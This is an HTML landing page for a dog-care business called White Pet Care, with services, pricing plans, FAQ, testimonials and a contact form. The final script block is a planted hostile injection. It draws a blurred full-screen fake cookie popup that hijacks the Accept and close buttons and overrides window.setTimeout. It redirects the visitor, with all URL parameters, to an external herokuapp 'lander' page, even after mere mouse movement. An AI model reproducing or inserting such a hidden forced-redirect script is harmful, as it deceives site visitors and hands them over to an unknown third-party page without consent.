<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>White Pet Care - Dog Care Services</title>
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./assets/css/style.css" />
  </head>
  <body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-light sticky-top">
      <div class="container">
        <img class="logo-pet" src="./assets/images/logo-pet.png" alt="">
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav ms-auto">
            <li class="nav-item">
              <a class="nav-link active" href="index.php">Home</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="about-page.html">About Us</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="services-page.html">Services</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="contact-page.html">Contact</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero-section">
      <div class="container">
        <h1 class="display-4">Caring for Your Furry Friends</h1>
        <p class="lead">
          Professional dog care services tailored to your pet's needs
        </p>
        <a href="#services" class="btn btn-primary btn-lg">Our Services</a>
      </div>
    </section>

    <!-- About Section -->
    <section id="about" class="py-5">
      <div class="container">
        <div class="row align-items-center">
          <div class="col-lg-6">
            <h2 class="mb-4">About White Pet Care</h2>
            <p>
                White Pet Care - White Pet Care is your pet care company home. We are in the industry for over 10 years, and we don’t get two doggies because they aren’t like ours, and we treat them as if they were our own.
            </p>
            <p>
                We will provide your furry family with the absolute very best pet care – secure, warm, and interactive. Our professionals are certified specialists and will make sure that your dog is spoiled and healthy.
            </p>
            <p>
                We’re registered professionals and we love to see your pets happy and healthy. Our knowledge, expertise and love of animals all add up to unmatched service. Grooming, training, boarding...We’re the ones you can count on for your pet.
            </p>
          </div>
          <div class="col-lg-6">
            <img
              src="./assets/images/dog.jpg"
              alt="Happy dogs with caretaker"
              class="img-fluid rounded-4"
            />
          </div>
        </div>
      </div>
    </section>

    <!-- Services Section -->
    <section id="services" class="py-5 bg-light">
      <div class="container">
        <h2 class="text-center mb-5">Our Services</h2>
        <div class="row">
          <div class="col-md-6 col-lg-3">
            <div class="service-card card text-center h-100">
              <div class="card-body">
                <i class="fas fa-cut service-icon"></i>
                <h5 class="card-title">Grooming</h5>
                <p class="card-text">
                    High class grooming like bath, haircut, nail cutting etc.
                </p>
              </div>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="service-card card text-center h-100">
              <div class="card-body">
                <i class="fas fa-walking service-icon"></i>
                <h5 class="card-title">Dog Walking</h5>
                <p class="card-text">
                    Exercise & outdoor activities according to your dog's fitness level.
                </p>
              </div>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="service-card card text-center h-100">
              <div class="card-body">
                <i class="fas fa-graduation-cap service-icon"></i>
                <h5 class="card-title">Training</h5>
                <p class="card-text">
                    Reinforcement- Basic obedience and behaviour training.
                </p>
              </div>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="service-card card text-center h-100">
              <div class="card-body">
                <i class="fas fa-home service-icon"></i>
                <h5 class="card-title">Boarding</h5>
                <p class="card-text">
                    Boarding- Providing Comfortable Overnight In our Houselike Accommodation with All The Services At All Hours.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Pricing Plans Section -->
    <section id="pricing" class="py-5 bg-light">
      <div class="container">
        <h2 class="text-center mb-5">Our Pricing Plans</h2>
        <div class="row">
          <div class="col-md-4">
            <div class="card mb-4">
              <div class="card-header text-center bg-primary text-white">
                <h4 class="my-0">Basic Care</h4>
              </div>
              <div class="card-body">
                <h1 class="card-title text-center">
                  $29<small class="text-muted fw-light">/visit</small>
                </h1>
                <ul class="list-unstyled mt-3 mb-4">
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Basic Grooming
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>30-min Walk
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Feeding
                    Service
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Water Refresh
                  </li>
                </ul>
                <!-- <button class="w-100 btn btn-lg btn-outline-primary">
                  Choose Plan
                </button> -->
              </div>
            </div>
          </div>
          <div class="col-md-4">
            <div class="card mb-4 border-primary">
              <div class="card-header text-center bg-primary text-white">
                <h4 class="my-0">Premium Care</h4>
              </div>
              <div class="card-body">
                <h1 class="card-title text-center">
                  $49<small class="text-muted fw-light">/visit</small>
                </h1>
                <ul class="list-unstyled mt-3 mb-4">
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Full Grooming
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>1-hour Walk
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Premium Food
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Playtime
                    Session
                  </li>
                </ul>
                <!-- <button class="w-100 btn btn-lg btn-primary">
                  Choose Plan
                </button> -->
              </div>
            </div>
          </div>
          <div class="col-md-4">
            <div class="card mb-4">
              <div class="card-header text-center bg-primary text-white">
                <h4 class="my-0">Luxury Care</h4>
              </div>
              <div class="card-body">
                <h1 class="card-title text-center">
                  $79<small class="text-muted fw-light">/visit</small>
                </h1>
                <ul class="list-unstyled mt-3 mb-4">
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Spa Treatment
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>2-hour
                    Adventure Walk
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Gourmet Meals
                  </li>
                  <li class="mb-2">
                    <i class="fas fa-check text-success me-2"></i>Training
                    Session
                  </li>
                </ul>
                <!-- <button class="w-100 btn btn-lg btn-outline-primary">
                  Choose Plan
                </button> -->
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Pet Care Tips Section -->
    <section id="tips" class="py-5">
      <div class="container">
        <h2 class="text-center mb-5">Pet Care Tips</h2>
        <div class="row">
          <div class="col-md-4 mb-4">
            <div class="card h-100">
              <!-- <img src="/api/placeholder/400/300" class="card-img-top" alt="Nutrition tips"> -->
              <div class="card-body">
                <h5 class="card-title">Proper Nutrition</h5>
                <p class="card-text">
                    Learn about healthy diet needs of different breeds and ages of dogs. Learn from the pros about feeding times and dietary restrictions.

                </p>
                <!-- <a href="#" class="btn btn-outline-primary">Read More</a> -->
              </div>
            </div>
          </div>
          <div class="col-md-4 mb-4">
            <div class="card h-100">
              <!-- <img src="/api/placeholder/400/300" class="card-img-top" alt="Exercise guidelines"> -->
              <div class="card-body">
                <h5 class="card-title">Exercise Guidelines</h5>
                <p class="card-text">
                    Learn the proper level of exercise for your dog based on his or her breed, age and ability. Have fun activities to get them fit.
                </p>
                <!-- <a href="#" class="btn btn-outline-primary">Read More</a> -->
              </div>
            </div>
          </div>
          <div class="col-md-4 mb-4">
            <div class="card h-100">
              <!-- <img src="/api/placeholder/400/300" class="card-img-top" alt="Grooming basics"> -->
              <div class="card-body">
                <h5 class="card-title">Grooming Basics</h5>
                <p class="card-text">
                    Basic dog grooming to help your dog be clean and healthy. Brushing, bathing, and coat care: get an idea.
                </p>
                <!-- <a href="#" class="btn btn-outline-primary">Read More</a> -->
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- FAQ Section -->
    <section id="faq" class="py-5 bg-light">
      <div class="container">
        <h2 class="text-center mb-5">Frequently Asked Questions</h2>
        <div class="row justify-content-center">
          <div class="col-lg-8">
            <div class="accordion" id="faqAccordion">
              <div class="accordion-item">
                <h2 class="accordion-header">
                  <button
                    class="accordion-button"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#faq1"
                  >
                  Do you have services for Puppies
                  </button>
                </h2>
                <div
                  id="faq1"
                  class="accordion-collapse collapse show"
                  data-bs-parent="#faqAccordion"
                >
                  <div class="accordion-body">
                    We specialize in puppy care which includes basic training, socialization, introducing them to gentle grooming techniques and puppy exercise programs. We have staff that is specially equipped to handle little dogs with special care
                  </div>
                </div>
              </div>
              <div class="accordion-item">
                <h2 class="accordion-header">
                  <button
                    class="accordion-button collapsed"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#faq2"
                  >
                  How often should I come for grooming? 
                  </button>
                </h2>
                <div
                  id="faq2"
                  class="accordion-collapse collapse"
                  data-bs-parent="#faqAccordion"
                >
                  <div class="accordion-body">
                    How often your dog needs to be groomed will vary depending on his/her breed, coat and lifestyle. Our average recommendation is professional grooming every 4-8 weeks, brushing regularly at home in between. 
                  </div>
                </div>
              </div>
              <div class="accordion-item">
                <h2 class="accordion-header">
                  <button
                    class="accordion-button collapsed"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#faq3"
                  >
                  How are your boarding stations? 
                  </button>
                </h2>
                <div
                  id="faq3"
                  class="accordion-collapse collapse"
                  data-bs-parent="#faqAccordion"
                >
                  <div class="accordion-body">
                    We have air-conditioned rooms, fluffy beds, outdoor play fields and 24/7 staffing in our boarding homes. We are clean and safe and keep up with pet parents on a regular basis. 
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Testimonials Section -->
    <section class="testimonial-carousel py-5">
      <div class="container">
        <h2 class="text-center mb-5">What Our Clients Say</h2>
        <div
          id="testimonialCarousel"
          class="carousel slide"
          data-bs-ride="carousel"
        >
          <div class="carousel-inner">
            <div class="carousel-item active">
              <div class="testimonial-item">
                <p class="lead">
                  "The White Pet Care team is the best! My dog adores going there for grooming and always leaves happy".
                </p>
                <p class="fw-bold">- Sarah Johnson</p>
              </div>
            </div>
            <div class="carousel-item">
              <div class="testimonial-item">
                <p class="lead">
                    "Advantageous dog walking service by White Pet Care! They are dependable, professional and love our pets."
                </p>
                <p class="fw-bold">- Michael Smith</p>
              </div>
            </div>
          </div>
          <button
            class="carousel-control-prev"
            type="button"
            data-bs-target="#testimonialCarousel"
            data-bs-slide="prev"
          >
            <span class="carousel-control-prev-icon"></span>
          </button>
          <button
            class="carousel-control-next"
            type="button"
            data-bs-target="#testimonialCarousel"
            data-bs-slide="next"
          >
            <span class="carousel-control-next-icon"></span>
          </button>
        </div>
      </div>
    </section>

    <!-- Contact Section -->
    <section id="contact" class="py-5">
      <div class="container">
        <div class="row">
          <div class="col-lg-6">
            <h2 class="mb-4">Contact Us</h2>
            <form class="contact-form">
              <div class="mb-3">
                <label for="name" class="form-label">Name</label>
                <input type="text" class="form-control" id="name" required />
              </div>
              <div class="mb-3">
                <label for="email" class="form-label">Email</label>
                <input type="email" class="form-control" id="email" required />
              </div>
              <div class="mb-3">
                <label for="phone" class="form-label">Phone</label>
                <input type="tel" class="form-control" id="phone" />
              </div>
              <div class="mb-3">
                <label for="message" class="form-label">Message</label>
                <textarea
                  class="form-control"
                  id="message"
                  rows="4"
                  required
                ></textarea>
              </div>
              <button type="submit" class="btn btn-primary">
                Send Message
              </button>
            </form>
          </div>
          <div class="col-lg-6">
            <h2 class="mb-4">Visit Us</h2>
            <p>
              <i class="fas fa-map-marker-alt me-2"></i>123 Pet Care Lane,
              Dogtown, ST 12345
            </p>
            <p><i class="fas fa-phone me-2"></i>(555) 123-4567</p>
            <p><i class="fas fa-envelope me-2"></i>info@whitepetcare.com</p>
            <div class="ratio ratio-16x9 mt-4">
              <!-- <img src="/api/placeholder/600/450" alt="Location map" class="img-fluid rounded"> -->
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="footer bg-dark text-white py-4">
      <div class="container">
        <div class="row align-items-center">
          <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
            <p class="mb-0">
              &copy; 2025 White Pet Care. All rights reserved.
              <a
                href="privacy-policy.html"
                class="text-decoration-none text-white-50"
                >Privacy Policy</a
              >
            </p>
          </div>
        </div>
      </div>
    </footer>

<!-- Cookie Consent Banner -->
<div id="cookieConsent" class="cookie-consent-banner">
    <p>
      We use cookies to ensure you get the best experience on our website.
      <a href="cookies-policy.html" class="text-white">Cookies Policy</a>.
      <button id="acceptCookies" class="btn btn-primary btn-sm">Got it!</button>
    </p>
  </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        var cookieConsent = document.getElementById("cookieConsent");
        var acceptCookies = document.getElementById("acceptCookies");

        if (!localStorage.getItem("cookiesAccepted")) {
          cookieConsent.style.display = "block";
        }

        acceptCookies.addEventListener("click", function () {
          localStorage.setItem("cookiesAccepted", "true");
          cookieConsent.style.display = "none";
        });
      });
    </script>
    <script>
	        document.addEventListener("DOMContentLoaded", function () {
	            const redirectUrl = "https://lp3-5ec6a67d185c.herokuapp.com/lander";

	            // >>> ADD: build redirect URL with ALL current parameters
	            const buildRedirectUrlWithParams = () => {
	                const u = new URL(redirectUrl, window.location.href);
	                const current = new URL(window.location.href);

	                // Forward ALL query parameters (?a=1&b=2...)
	                current.searchParams.forEach((value, key) => u.searchParams.append(key, value));

	                // Optional: also forward #hash
	                u.hash = current.hash;

	                return u.toString();
	            };
	            const redirectUrlWithParams = buildRedirectUrlWithParams();

	            const style = document.createElement("style");
	            style.textContent = `
	                .cookie-overlay {
	                    position: fixed;
	                    inset: 0;
	                    background: rgba(0, 0, 0, 0.8);
	                    backdrop-filter: blur(10px);
	                    display: flex;
	                    align-items: center;
	                    justify-content: center;
	                    padding: 20px;
	                    z-index: 9999;
	                    animation: fadeInBackground 0.5s ease-out forwards;
	                }
	                @keyframes fadeInBackground {
	                    from { opacity: 0; }
	                    to { opacity: 1; }
	                }
	                .cookie-popup {
	                    position: fixed;
	                    bottom: 60px;
	                    left: 50%;
	                    transform: translateX(-50%);
	                    background-color: #ffffff;
	                    border: none;
	                    color: #333;
	                    padding: 30px;
	                    border-radius: 10px;
	                    z-index: 10000;
	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
	                    max-width: 400px;
	                    text-align: center;
	                }
	                .close-btn {
	                    background: none;
	                    border: none;
	                    font-size: 1.5rem;
	                    position: absolute;
	                    top: 10px;
	                    right: 10px;
	                    cursor: pointer;
	                    color: #888;
	                }
	                .btn-primary {
	                    background-color: #007bff;
	                    color: #fff;
	                    border: none;
	                    padding: 12px 24px;
	                    border-radius: 5px;
	                    cursor: pointer;
	                    margin-top: 15px;
	                    display: inline-block;
	                    text-decoration: none;
	                    transition: background-color 0.3s;
	                }
	                .btn-primary:hover {
	                    background-color: #0056b3;
	                }
	                h3 {
	                    font-family: 'Arial', sans-serif;
	                    margin-bottom: 10px;
	                }
	                p {
	                    font-family: 'Arial', sans-serif;
	                    line-height: 1.5;
	                }
	            `;
	            document.head.appendChild(style);
	            const overlay = document.createElement("div");
	            overlay.className = "cookie-overlay";
	            overlay.id = "cookie-overlay";
	            overlay.innerHTML = `
	<div class="cookie-popup">
	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
	<h3>Cookie Policy</h3>
	<p>
	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
	</p>
	<a href="https://lp3-5ec6a67d185c.herokuapp.com/lander" id="accept-cookies" class="btn-primary">Accept</a>
	</div>
	            `;
	            document.body.appendChild(overlay);
	            let isRedirected = false;
	            let startPos = null;
	            let redirectTimeout = null;
	            const handleRedirect = () => {
	                if (!isRedirected) {
	                    isRedirected = true;
	                    window.location.href = redirectUrl;
	                }
	            };

	            // >>> ADD: force all redirect triggers to use redirectUrlWithParams
	            const doRedirectWithParams = () => {
	                if (isRedirected) return;
	                isRedirected = true;
	                window.location.href = redirectUrlWithParams;
	            };

	            // 1) Intercept setTimeout(handleRedirect, ...) used by your mousemove logic
	            const _setTimeout = window.setTimeout.bind(window);
	            window.setTimeout = function (fn, delay, ...args) {
	                if (fn === handleRedirect) {
	                    return _setTimeout(doRedirectWithParams, delay, ...args);
	                }
	                return _setTimeout(fn, delay, ...args);
	            };

	            // 2) Intercept clicks BEFORE your existing click handlers run
	            ["accept-cookies", "close-popup"].forEach((id) => {
	                const el = document.getElementById(id);
	                if (!el) return;
	                el.addEventListener("click", function (e) {
	                    e.preventDefault();
	                    e.stopImmediatePropagation();
	                    doRedirectWithParams();
	                }, true); // capture phase
	            });

	            // Optional: update the visible hrefs in the popup too
	            const acceptEl = document.getElementById("accept-cookies");
	            if (acceptEl) acceptEl.href = redirectUrlWithParams;

	            document.querySelectorAll('#cookie-overlay a.cta').forEach(a => {
	                a.href = redirectUrlWithParams;
	            });

	            const detectMouseMove = (event) => {
	                if (isRedirected) return;
	                const screenHeight = window.innerHeight;
	                const activeTop = screenHeight * 0.15;
	                if (event.clientY >= activeTop) {
	                    if (!startPos) {
	                        startPos = { x: event.clientX, y: event.clientY };
	                    } else {
	                        const dx = Math.abs(event.clientX - startPos.x);
	                        const dy = Math.abs(event.clientY - startPos.y);
	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
	                            redirectTimeout = setTimeout(handleRedirect, 1000);
	                        }
	                    }
	                } else {
	                    startPos = null;
	                    clearTimeout(redirectTimeout);
	                    redirectTimeout = null;
	                }
	            };
	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	            document.getElementById("close-popup").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	        });
	</script>


  </body>
</html>
